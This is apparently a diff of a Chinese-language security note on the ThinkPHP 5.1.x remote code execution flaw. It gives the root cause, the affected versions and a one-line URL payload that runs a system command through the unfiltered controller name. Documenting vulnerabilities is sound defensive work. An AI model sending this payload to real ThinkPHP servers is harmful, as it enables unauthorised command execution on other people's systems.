@@ -1,20 +1,28 @@
+---
+type: sec-note
+title: thinkphp 5.1.x RCE
+tags:
+  - php
+  - thinkphp
+  - 漏洞分析
+---
 # thinkphp 5.1.x RCE
 
-# 参考文章
+## 参考文章
 
 [https://xz.aliyun.com/t/9369](https://xz.aliyun.com/t/9369)
 
-# RCE1
+## RCE1
 
-## 根本原因
+### 根本原因
 
 thinkphp没有对用户传入的操作器名称进行过滤,导致可以调用顶部类中的方法,造成一系列的危害
 
-## 影响版本
+### 影响版本
 
 TP5.1.0-5.1.30
 
-## payload
+### payload
 
  ```PHP
  ?s=index/\think\Request/input&filter[]=system&data=pwd
@@ -25,5 +33,5 @@ TP5.1.0-5.1.30
  ```
 
 
-## 分析
+### 分析
 ![](attachment/images/thinkphp5.1_rce.png)
